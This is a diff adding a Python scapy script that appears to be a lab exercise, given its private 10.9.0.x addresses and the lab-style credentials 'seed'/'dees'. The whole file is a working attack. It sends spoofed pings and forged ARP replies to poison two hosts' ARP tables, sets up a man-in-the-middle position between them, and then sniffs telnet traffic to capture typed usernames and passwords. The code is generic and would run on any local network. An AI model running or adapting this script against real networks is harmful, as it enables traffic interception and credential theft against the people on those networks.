@@ -1,0 +1,174 @@
+#!/usr/bin/env python3
+from scapy.all import *
+import time
+import sys
+import threading
+
+# Network configuration
+ATTACKER_IP = "10.9.0.1"
+HOST_A_IP = "10.9.0.5"
+HOST_B_IP = "10.9.0.6"
+FAKE_IP = "10.9.0.7"  # Random IP for initial ARP entry
+
+def get_interface():
+    """Find the correct network interface (br-xxx)"""
+    interfaces = get_if_list()
+    for iface in interfaces:
+        if iface.startswith('br-'):
+            return iface
+    return None
+
+def get_mac_address(interface):
+    """Get MAC address of specified interface"""
+    return get_if_hwaddr(interface)
+
+def spoof_ping_to_create_arp_entry(target_ip, fake_ip, attacker_mac, interface):
+    """Send spoofed ping to create incomplete ARP entry"""
+    print(f"Step 1: Sending spoofed ping from {fake_ip} to {target_ip}")
+    
+    # Create spoofed ping packet
+    eth = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")  # Broadcast
+    ip = IP(src=fake_ip, dst=target_ip)
+    icmp = ICMP()
+    packet = eth/ip/icmp
+    
+    # Send the packet
+    sendp(packet, iface=interface, verbose=0)
+    print(f"Spoofed ping sent. Check 'arp -n' on {target_ip} for incomplete entry.")
+    time.sleep(1)
+
+def spoof_arp_reply(target_ip, spoofed_ip, attacker_mac, interface):
+    """Send spoofed ARP reply to poison ARP table"""
+    print(f"Step 2: Sending ARP reply: {spoofed_ip} is at {attacker_mac}")
+    
+    # Create ARP reply
+    arp_reply = ARP(
+        op=2,  # ARP reply
+        psrc=spoofed_ip,  # IP we're claiming to be
+        hwsrc=attacker_mac,  # Our MAC address
+        pdst=target_ip,  # Target's IP
+        hwdst="ff:ff:ff:ff:ff:ff"  # Broadcast
+    )
+    
+    eth = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast
+    packet = eth/arp_reply
+    
+    sendp(packet, iface=interface, verbose=0)
+    print(f"ARP reply sent. Check 'arp -n' on {target_ip} to verify poisoning.")
+    time.sleep(1)
+
+def create_mitm_attack(attacker_mac, interface):
+    """Create Man-in-the-Middle attack between Host A and Host B"""
+    print("\nStep 3: Creating Man-in-the-Middle attack")
+    print("Poisoning Host A's ARP table (Host B -> Attacker)")
+    
+    # Make Host A think Host B is at attacker's MAC
+    spoof_ping_to_create_arp_entry(HOST_A_IP, HOST_B_IP, attacker_mac, interface)
+    time.sleep(1)
+    spoof_arp_reply(HOST_A_IP, HOST_B_IP, attacker_mac, interface)
+    
+    print("Poisoning Host B's ARP table (Host A -> Attacker)")
+    
+    # Make Host B think Host A is at attacker's MAC
+    spoof_ping_to_create_arp_entry(HOST_B_IP, HOST_A_IP, attacker_mac, interface)
+    time.sleep(1)
+    spoof_arp_reply(HOST_B_IP, HOST_A_IP, attacker_mac, interface)
+    
+    print("MiTM attack setup complete!")
+    print("Host A thinks Host B is at attacker's MAC")
+    print("Host B thinks Host A is at attacker's MAC")
+    print("All traffic between A and B will go through the attacker")
+
+def telnet_sniffer(interface):
+    """Sniff telnet traffic in MiTM scenario"""
+    print("\nStep 4: Starting telnet sniffer for MiTM attack")
+    print("Now start telnet session from Host A to Host B")
+    print("Username: seed, Password: dees")
+    print()
+    
+    captured_keystrokes = ""
+    
+    def process_packet(pkt):
+        nonlocal captured_keystrokes
+        
+        if TCP in pkt and (pkt[TCP].dport == 23 or pkt[TCP].sport == 23):
+            if Raw in pkt:
+                data = pkt[Raw].load.decode('utf-8', errors='ignore')
+                
+                # Only capture client-to-server traffic (actual keystrokes)
+                if pkt[TCP].dport == 23:  # Going to telnet server
+                    for char in data:
+                        if ord(char) >= 32 or char in ['\r', '\n']:
+                            captured_keystrokes += char
+                            if char == '\r':
+                                print()
+                                if "seed" in captured_keystrokes:
+                                    print(f"[MiTM] USERNAME CAPTURED: seed")
+                                if "dees" in captured_keystrokes:
+                                    print(f"[MiTM] PASSWORD CAPTURED: dees")
+                            else:
+                                print(char, end='', flush=True)
+    
+    try:
+        sniff(iface=interface, filter="tcp port 23", prn=process_packet, store=0, timeout=60)
+    except KeyboardInterrupt:
+        print("\nTelnet sniffer stopped.")
+
+def main():
+    if len(sys.argv) < 2:
+        print("Usage:")
+        print("  python3 arp_poisoning.py demo     - Demonstrate basic ARP poisoning")
+        print("  python3 arp_poisoning.py mitm     - Full MiTM attack with telnet sniffer")
+        sys.exit(1)
+    
+    mode = sys.argv[1]
+    
+    # Get network interface and MAC
+    interface = get_interface()
+    if not interface:
+        print("Error: Could not find bridge interface")
+        sys.exit(1)
+    
+    attacker_mac = get_mac_address(interface)
+    print(f"Using interface: {interface}")
+    print(f"Attacker MAC: {attacker_mac}")
+    print()
+    
+    if mode == "demo":
+        print("=== ARP Poisoning Demonstration ===")
+        print(f"Target: {HOST_A_IP}")
+        print(f"Before running: Check 'arp -n' on Host A")
+        print()
+        
+        # Step 1: Create incomplete ARP entry
+        spoof_ping_to_create_arp_entry(HOST_A_IP, FAKE_IP, attacker_mac, interface)
+        print(f"Now check 'arp -n' on Host A - should see {FAKE_IP} with incomplete MAC")
+        input("Press Enter to continue to ARP reply spoofing...")
+        
+        # Step 2: Poison ARP table
+        spoof_arp_reply(HOST_A_IP, FAKE_IP, attacker_mac, interface)
+        print(f"Now check 'arp -n' on Host A - should see {FAKE_IP} mapped to {attacker_mac}")
+        
+    elif mode == "mitm":
+        print("=== Man-in-the-Middle Attack ===")
+        print("This will poison both Host A and Host B ARP tables")
+        print("Then capture telnet traffic between them")
+        print()
+        
+        # Set up MiTM attack
+        create_mitm_attack(attacker_mac, interface)
+        
+        print("\nCheck ARP tables:")
+        print(f"On Host A: 'arp -n' should show {HOST_B_IP} -> {attacker_mac}")
+        print(f"On Host B: 'arp -n' should show {HOST_A_IP} -> {attacker_mac}")
+        
+        input("\nPress Enter to start telnet sniffer...")
+        
+        # Start telnet sniffer
+        telnet_sniffer(interface)
+    
+    else:
+        print("Invalid mode. Use 'demo' or 'mitm'")
+
+if __name__ == "__main__":
+    main()
